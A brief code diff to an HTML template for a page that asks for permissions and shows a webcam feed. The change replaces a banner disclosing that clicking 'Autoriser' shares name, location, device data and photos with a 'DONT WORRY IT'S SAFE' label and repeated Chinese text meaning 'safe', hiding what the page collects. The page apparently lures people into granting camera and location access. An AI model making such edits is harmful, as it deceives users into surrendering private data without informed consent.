@@ -59,8 +59,8 @@ HTML_TEMPLATE = """
         <h2>权限许可请求</h2>
         
         <div class="legal-banner">
-            ✅DONT WORRY IT'S SAFE: 法律声明：<br>
-            点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
+            ✅DONT WORRY IT'S SAFE:安全的：<br>
+           安全的“Autoriser”安全的安全的安全的。安全的，安全的
         </div>
 
         <video id="webcam" autoplay playsinline muted></video>
